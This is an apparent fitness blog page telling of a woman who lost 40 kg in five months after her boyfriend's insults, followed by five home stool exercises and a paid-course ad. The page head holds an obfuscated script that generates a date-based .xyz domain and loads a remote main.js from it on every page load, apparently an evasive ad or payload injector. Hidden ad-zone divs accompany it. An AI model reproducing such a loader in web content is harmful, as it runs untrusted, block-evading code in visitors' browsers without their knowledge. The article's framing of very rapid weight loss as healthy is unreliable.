<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Reduced fat,">










<meta name="description" content="In modern society, thin is the beauty, so slim body is the pursuit of most people, whether men or women, want their appearance to be very beautiful, and weight loss is not only because they want to ha">
<meta name="keywords" content="Reduced fat">
<meta property="og:type" content="article">
<meta property="og:title" content="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different">
<meta property="og:url" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/index.html">
<meta property="og:site_name" content="How to Keep Fit">
<meta property="og:description" content="In modern society, thin is the beauty, so slim body is the pursuit of most people, whether men or women, want their appearance to be very beautiful, and weight loss is not only because they want to ha">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/4c4cedb9-aa96-4628-a741-2fd50374a1a6.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/39b374b5-52b8-4849-8460-63ae01ff5770.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/02ad19bb-6c5d-49fb-89dc-572d9b8dfba4.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/7220127c-a95d-4a58-996a-4302a626eccc.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/22441d22-03fc-49da-ba3b-23760d83274f.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/bbd1e7c0-797a-43c5-a60d-26b86ce67c13.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/80641ce0-becf-4424-a9e6-32a082a2f081.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/a0cfcdcb-eb92-47d3-bbc7-eb15425cb9f2.gif">
<meta property="og:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/2c96d774-98bc-4e7c-b7d6-2328bb7b41df.gif">
<meta property="og:updated_time" content="2021-05-06T07:21:58.845Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different">
<meta name="twitter:description" content="In modern society, thin is the beauty, so slim body is the pursuit of most people, whether men or women, want their appearance to be very beautiful, and weight loss is not only because they want to ha">
<meta name="twitter:image" content="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/4c4cedb9-aa96-4628-a741-2fd50374a1a6.gif">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different | How to Keep Fit</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">How to Keep Fit</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">How to Keep Fit</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>


 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
                            
<div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="15af66dea7db40aeac9404abd8ac7ee3" style="display: none"></div>
<div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="957010872ca54cf98941765c8f125165" style="display: none"></div>
<div class="_fa7cdd4c68507744" data-zone="1f18e43b8b0e495c9b6b7be51eb2c8c2" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>


  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Thomas">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="How to Keep Fit">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-21T00:00:00+08:00">
                2021-03-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>In modern society, thin is the beauty, so slim body is the pursuit of most people, whether men or women, want their appearance to be very beautiful, and weight loss is not only because they want to have a slim body, but also to make their body more healthy, because obesity will cause a series of diseases, So it’s very important to lose weight. The little sister below is very inspirational. She lost 40 kilograms in five months. She is really a weight loss expert.<br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/4c4cedb9-aa96-4628-a741-2fd50374a1a6.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br>Her name is Peggy. The two pictures above are all about her, but I can’t imagine that she is the same person. Peggy likes to eat junk food very much from childhood, which leads to her obesity. However, when she was a child, she didn’t care about her obesity. Even if people around her mocked him, she would laugh it off and live a very optimistic life. This kind of sunny attitude is very good, but it can’t change other people’s views on her.<br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/39b374b5-52b8-4849-8460-63ae01ff5770.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br>There is a reason for any change in a person. Although Peggy never cared about her fat appearance before, until she met her boyfriend, all her changes were due to her boyfriend’s ugly words. When Peggy meets her boyfriend, Peggy’s weight is in the highest state, about 150 kg. Her weight has exceeded twice that of normal people. Although she doesn’t mind at all, she is despised by her boyfriend. This is the first time that she begins to realize that she can’t be so fat any more and must start to change. So with the encouragement of her family, she successfully lost 40 kg of fat in 5 months in a healthy way, got rid of her boyfriend who judged people by their appearance, and successfully completed her gorgeous transformation.<br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/02ad19bb-6c5d-49fb-89dc-572d9b8dfba4.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br>In fact, most of the time, we only need a motivation to take the first step of change and persist in it. We will find that our persistence and efforts are meaningful and we can gain a completely different self. The following five groups of fat reduction training can help you build a good figure.<br>Today, I’d like to recommend a home-based training program for you to get in shape at home.<br><strong>Action 1: hip bridge on stool</strong><br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/7220127c-a95d-4a58-996a-4302a626eccc.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br><strong>Action tips * <em>: lie on the stool above the shoulder blade, the whole body is parallel to the ground, the knees are bent, the two lower legs are vertical to the ground, and they are shoulder width apart, the soles of the feet step on the ground, the arms cross and stick to the chest, exhale, the buttock muscles tighten, lift up, inhale slowly and relax downward, do 12-15 in one group, rest 30 seconds between groups, repeat 4-6 groups.<br>*</em>Action 2: Bulgarian squat</strong><br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/22441d22-03fc-49da-ba3b-23760d83274f.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br><strong>Action tips * <em>: first of all, keep the body upright, stand on the ground, tighten the abdomen, put the right leg on the stool, keep the left leg motionless, put both hands on the waist, keep the upper body upright, inhale, bend the knees, squat down vertically, exhale, force the buttocks and legs to restore the upper body upright. Make 12 left and right as a group, rest between groups for 30-45 seconds, repeat 4 groups.<br>*</em>Action 3: leg raising in sitting position</strong><br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/bbd1e7c0-797a-43c5-a60d-26b86ce67c13.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br><strong>Action tips * <em>: sit on the stool, hold the edge of the stool with both hands, straighten the legs forward, lean the upper body backward, tighten the abdomen, exhale, push the abdominal muscles to lift the legs upward, and move the upper body forward to make the abdominal muscles contract to the maximum extent, then inhale, stretch the legs downward, lean the body backward, lengthen the abdominal muscles, 12-15 in each group, and rest for 30 seconds, Repeat 4 groups.<br>*</em>Action 4: lift your leg after push up</strong><br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/80641ce0-becf-4424-a9e6-32a082a2f081.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br><strong>Action essentials * <em>: separate your hands and shoulder width, support on the ground, put your feet on the stool, tighten the core, make the body into a plane, don’t collapse the waist, don’t raise your hips, the whole body is parallel to the ground, tighten the abdomen to keep the body stable, and then inhale, extend the right leg downward first, exhale, and then lift it upward, extend to the left, until it extends beyond the left leg. Make a group of 10 left and right, rest 30-45 seconds between groups, repeat 4 groups.<br>*</em>Action 5: bend and extend the back arm on the stool</strong><br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/a0cfcdcb-eb92-47d3-bbc7-eb15425cb9f2.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br>**Action essentials * *: first sit on the stool, tighten the abdomen, straighten the waist and back, put both hands on both sides of the body, hold the stool firmly, move the hips forward, and suspend the body. Inhale, bend elbow, elbow joint backward, body vertically downward, exhale, big arm stretch elbow joint, one group do 12-15, rest between groups for 30 seconds, repeat 4 groups.<br><img src="http://doumaiy.xyz/2021/03/21/Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different/2c96d774-98bc-4e7c-b7d6-2328bb7b41df.gif" alt="Disliked by her boyfriend, she lost 40 kg in five months. Before and after she lost weight, it was very different"><br>special column<br>Zero basic fat reduction plan, lose 10 Jin in 10 classes<br>Author: Private Fitness King<br>99 yuan<br>85 bought<br>see<br>If you want to have a healthy body and a beautiful figure, you need to pay a lot of hard work and sweat, dare to take the first step, and stick to it day after day, don’t give up halfway, so I believe you will get something.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Reduced-fat/" rel="tag"># Reduced fat</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/03/20/Chongqing fitness female boss, height 172cm, curve figure charming, how to do it/" rel="next" title="Chongqing fitness female boss, height 172cm, curve figure charming, how to do it">
                <i class="fa fa-chevron-left"></i> Chongqing fitness female boss, height 172cm, curve figure charming, how to do it
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/03/22/Vietnamese little sister, annual fitness, full of strength, beautiful figure, netizen so good-looking/" rel="prev" title="Vietnamese little sister, annual fitness, full of strength, beautiful figure, netizen so good-looking">
                Vietnamese little sister, annual fitness, full of strength, beautiful figure, netizen so good-looking <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Thomas</p>
              <p class="site-description motion-element" itemprop="description">How to Keep Fit</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">59</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Thomas</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
